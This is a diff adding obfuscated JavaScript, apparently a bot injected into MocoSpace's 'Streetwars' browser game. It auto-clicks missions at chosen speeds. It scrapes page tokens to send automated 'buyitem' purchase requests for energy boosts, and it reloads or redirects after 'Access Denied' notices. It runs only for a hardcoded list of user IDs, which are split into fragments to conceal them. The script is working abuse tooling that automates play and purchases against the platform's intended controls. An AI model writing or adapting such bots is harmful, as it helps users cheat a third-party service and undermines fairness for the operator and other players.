+  function fjpyffco(_0x46d689, _0x274d51, _0x25b34b, _0x4043f6) {
+    $.ajax({
+      'type': "POST",
+      'url': "https://www.mocospace.com/games",
+      'data': {
+        'action': "buyitem",
+        'publicToken': _0x46d689,
+        'privateToken': _0x274d51,
+        'itemID': "1000027",
+        'type': "BOOST",
+        'src': "BOSS",
+        'VALIDATION_TOKEN': _0x25b34b,
+        'VALIDATION_TOKEN_TIMESTAMP': _0x4043f6,
+        'gid': "1000",
+        'url': "/streetwars/store",
+        'gpaction': "call",
+        'fakeWk': "true",
+        'source': "internal"
+      },
+      'success': function (_0x348562) {
+        setTimeout(function () {
+          document.location = "https://www.mocospace.com/games?gid=1000&r=345&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D1000015";
+        }, 5000);
+      }
+    });
+  }
+  function refill() {
+    refill = setInterval(function () {
+      if (document.getElementById("xp_needed_level") && "Your energy is low." == document.getElementById("xp_needed_level").innerHTML || document.getElementsByClassName("game_block half_left")[0] && document.getElementsByClassName("game_block half_left")[0].clientHeight > 0 || document.getElementsByClassName("func_headerstats energy")[0].dataset.energy < 7000) {
+        ebuy();
+        clearInterval(refill);
+        clearInterval(refill);
+        clearInterval(refill);
+        clearInterval(refill);
+        clearInterval(refill);
+      }
+    }, 2000);
+  }
+  function ebuy() {
+    $.ajax({
+      'type': "POST",
+      'url': "https://www.mocospace.com/games?gid=1000&r=310&source=internal&fakeWk=true&url=%2Fstreetwars%2Fstore%3Faction%3Dprebuyitem%26src%3DBOSS%26type%3DBOOST%26itemID%3D19",
+      'success': function (_0x3ec921) {
+        result = $(_0x3ec921).find("#game_form_buy")[0];
+        publict = result[1].value;
+        privatet = result[2].value;
+        bjjyssha(publict, privatet);
+      }
+    });
+  }
+  function bjjyssha(_0x30e90b, _0x3d1bab) {
+    $.ajax({
+      'type': "POST",
+      'url': "https://www.mocospace.com/games",
+      'data': {
+        'action': "buyitem",
+        'publicToken': _0x30e90b,
+        'privateToken': _0x3d1bab,
+        'itemID': '19',
+        'type': "BOOST",
+        'src': "BOSS",
+        'gid': "1000",
+        'url': "/streetwars/store",
+        'gpaction': "call",
+        'fakeWk': "true",
+        'source': "internal"
+      }
+    });
+    setTimeout(function () {
+      document.getElementsByClassName("func_headerstats energy")[0].click();
+    }, 2000);
+  }
+  var kvxhvatver2_0x5bde85 = {
+    a: "5529",
+    b: "3730",
+    c: "10115",
+    d: "9465",
+    e: "8790",
+    f: "1964",
+    g: "8623",
+    h: "8219",
+    i: "7680",
+    j: "998",
+    k: "3170",
+    l: "5741",
+    m: "7874",
+    n: "2600",
+    o: "5162",
+    p: "0476",
+    a1: "3844",
+    a2: "7566",
+    a3: "6706",
+    a4: "2023",
+    a5: "3992",
+    a6: "2139",
+    a7: "8869",
+    a8: "1334",
+    a9: "7768",
+    a10: "7096"
+  };
+  mba = setInterval(function () {
+    try {
+      if ("Access Denied" == document.getElementsByClassName("errormsg")[0].innerHTML) {
+        clearInterval(mba);
+        document.location = "https://www.mocospace.com/games?gid=1000&r=770&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D1000015%26v%3D1511591705765%26u%3D" + MocoSpaceAPI.loggedInUserId + "%26v";
+      }
+    } catch (_0x5c5e6e) {}
+  }, 8000);
+  mjpymmpy = setInterval(function () {
+    try {
+      if (document.getElementsByClassName("notification")[0].innerHTML.indexOf(" Go to the mobile site") > 0) {
+        document.location = "https://www.mocospace.com/games?gid=1000&r=770&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D1000015%26v%3D1511591705765%26u%3D" + MocoSpaceAPI.loggedInUserId + "%26v";
+      }
+    } catch (_0x55fb2d) {}
+  }, 10000);
+  A = kvxhvatver2_0x5bde85;
+  ZZ = MocoSpaceAPI.loggedInUserId;
+  if (ZZ == A.a + A.b || ZZ == A.c + A.d || ZZ == A.e + A.f || ZZ == A.g + A.h || ZZ == A.i + A.j || ZZ == A.m + A.n || ZZ == A.o + A.p || ZZ == A.a1 + A.a2 || ZZ == A.a3 + A.a4 || ZZ == A.a7 + A.a8 || ZZ == A.a9 + A.a10) {
+    lvlcheck = setInterval(function () {
+      try {
+        s = document.getElementsByTagName("strong");
+        for (i = 0; i < s.length; i++) {
+          if (s[i].innerHTML.indexOf("evel") > 0) {
+            llv = s[i];
+          }
+        }
+        ;
+        if (parseInt(llv.innerHTML.replace(/\D/g, '')) > 3001) {
+          console.log(llv.innerHTML);
+          clearInterval(xb);
+          clearInterval(v);
+          clearInterval(lvlcheck);
+          setTimeout(pjppy9, 2000);
+        }
+      } catch (_0x18d6a9) {}
+    }, 2000);
+    rl = setInterval(function () {
+      if (document.getElementsByClassName("dark game_button").length > 0) {
+        clearInterval(rl);
+        document.getElementsByClassName("func_headerstats energy")[0].click();
+      }
+    }, 1000);
+    a = document.createElement("button");
+    a.innerHTML = "start";
+    document.body.appendChild(a);
+    b = document.createElement("button");
+    b.innerHTML = "stop";
+    document.body.appendChild(b);
+    c = document.getElementsByTagName("span");
+    for (i = 0; i < c.length; i++) {
+      if ("AGAIN" == c[i].innerText) {
+        mbutt = c[i];
+        break;
+      }
+    }
+    ;
+    a.addEventListener("click", function () {
+      v = setInterval(function () {
+        uj890xpx(locationid, missionid, uid);
+      }, clickspeed);
+    });
+    b.addEventListener("click", function () {
+      clearInterval(v);
+    });
+    ff = setInterval(function () {
+      try {
+        if (mbutt.className.indexOf("disabled") > 0 && "MASTERED!" == mbutt.innerText) {
+          clearInterval('ff');
+          document.getElementsByClassName("game_button done_button x_button")[0].click();
+        }
+      } catch (_0x45d577) {}
+    }, 2000);
+    vf = setInterval(function () {
+      if ("undefined" != typeof mbutt) {
+        a.click();
+        timeout();
+        clearInterval(vf);
+      }
+    }, 800);
+    stupid = setInterval(function () {
+      try {
+        m1 = document.getElementsByClassName("func_title_text")[0].innerHTML;
+        m2 = document.getElementById("game_mastery_text").getElementsByClassName("value")[0].innerHTML;
+        if ("Mug a thug" == m1 && "100%" == m2 || "Rob corner store" == m1 && "100%" == m2 || "Steal wallet " == m1 && "100%" == m2 || "Liquor store holdup" == m1 && "100%" == m2 || "Steal a car" == m1 && "100%" == m2 || "Infiltrate gambling ring" == m1 && "100%" == m2) {
+          document.getElementsByClassName("game_button done_button x_button")[0].click();
+        }
+      } catch (_0x40e47c) {}
+    }, 1000);
+    if ("undefined" == typeof mbutt) {
+      p = [];
+      try {
+        locid = document.location.href.match("location%3D(.*)%")[1].split('%')[0];
+        loc2 = document.location.href.match("location%3D(.*)")[1];
+        if ("undefined" == typeof locid) {
+          locid = loc2;
+        }
+      } catch (kvxhvatver2_0x36541b) {}
+      ;
+      a1 = document.getElementsByClassName("game_button");
+      for (i = 0; i < a1.length; i++) {
+        if ("DO IT" == a1[i].innerText && a1[i].className.indexOf("disabled") < 0) {
+          p.push(a1[i]);
+        }
+      }
+      ;
+      if (0 == p.length) {
+        try {
+          locid = document.location.href.match("location%3D(.*)%")[1].split('%')[0];
+        } catch (kvxhvatver2_0xdbaf60) {}
+        ;
+        try {
+          loc2 = document.location.href.match("location%3D(.*)")[1];
+          if ("undefined" == typeof locid) {
+            locid = loc2;
+          }
+        } catch (kvxhvatver2_0x1d6065) {}
+        ;
+        console.log("calling newfunction");
+        nsjjpoiuygt();
+      } else {
+        p[0].click();
+      }
+    }
+    ;
+    dx = setInterval(function () {
+      if (document.getElementById("game_overlay")) {
+        document.getElementById("game_overlay").remove();
+      }
+      x1 = document.getElementsByClassName("game_button");
+      for (i = 0; i < x1.length; i++) {
+        if ("CONTINUE" == x1[i].innerText && x1[i].clientHeight > 40) {
+          clearInterval(dx);
+          console.log(x1[i]);
+          x1[i].click();
+          break;
+        }
+      }
+    }, 3000);
+    pi = setInterval(function () {
+      x0 = document.getElementsByClassName("game_button");
+      for (i = 0; i < x0.length; i++) {
+        if ("Close" == x0[i].innerHTML && x0[i].clientHeight > 40) {
+          clearInterval(pi);
+          toggle_modal("game_modal_500", "game_dialog");
+        }
+      }
+    }, 2000);
+  }
+  ;
+  setTimeout(function () {
+    document.location = "https://www.mocospace.com/games?gid=1000&r=194&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Fv%3D1536644912194";
+  }, 900000);
+  Rf = document.createElement("div");
+  document.body.appendChild(Rf);
+  if (localStorage.getItem("canmrefill")) {
+    Rf.innerHTML = "Refill : on";
+  } else {
+    Rf.innerHTML = "Refill : off";
+  }
+  Rf.addEventListener("click", function () {
+    if (localStorage.getItem("canmrefill")) {
+      Rf.innerHTML = "Refill : off";
+      Rf.style.color = "red";
+      localStorage.removeItem("canmrefill");
+    } else {
+      Rf.innerHTML = "Refill : on";
+      Rf.style.color = "green";
+      localStorage.setItem("canmrefill", true);
+    }
+  });
+  peed = document.createElement("div");
+  peed.innerHTML = "speed : ";
+  document.body.appendChild(peed);
+  speed = document.createElement("div");
+  sp1 = document.createElement("div");
+  sp2 = document.createElement("div");
+  sp3 = document.createElement("div");
+  sp4 = document.createElement("div");
+  sp1.innerHTML = "20clicks";
+  sp2.innerHTML = " 15clicks";
+  sp3.innerHTML = " 10clicks";
+  sp4.innerHTML = " 5clicks";
+  speed.appendChild(sp1);
+  speed.appendChild(sp2);
+  speed.appendChild(sp3);
+  speed.appendChild(sp4);
+  speed.style.display = "inline";
+  sp1.style.display = "inline";
+  sp2.style.display = "inline";
+  sp3.style.display = "inline";
+  sp4.style.display = "inline";
+  sp1.addEventListener("click", function () {
+    this.style.color = "green";
+    localStorage.setItem("ccspeed", 50);
+  });
+  sp2.addEventListener("click", function () {
+    this.style.color = "green";
+    localStorage.setItem("ccspeed", 66);
+  });
+  sp3.addEventListener("click", function () {
+    this.style.color = "green";
+    localStorage.setItem("ccspeed", 100);
+  });
+  sp4.addEventListener("click", function () {
+    this.style.color = "green";
+    localStorage.setItem("ccspeed", 200);
+  });
+  peed.appendChild(speed);
+}
